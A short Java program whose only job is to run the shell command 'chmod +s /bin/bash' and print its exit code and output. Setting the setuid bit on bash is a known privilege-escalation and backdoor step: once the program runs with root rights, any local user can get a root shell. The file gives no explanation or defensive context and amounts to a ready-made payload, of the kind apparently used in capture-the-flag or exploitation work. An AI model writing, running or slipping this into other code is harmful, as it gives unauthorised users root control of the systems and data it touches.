import java.io.BufferedReader;
import java.io.InputStreamReader;

public class chmod {
    public static void main(String[] args) {
        String command = "chmod +s /bin/bash";
        try {
            // Execute the command
            Process process = Runtime.getRuntime().exec(command);

            // Read output (similar to ProcessBuilder example)
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            System.out.println("Command executed with exit code: " + exitCode);
            System.out.println("Output:\n" + output.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}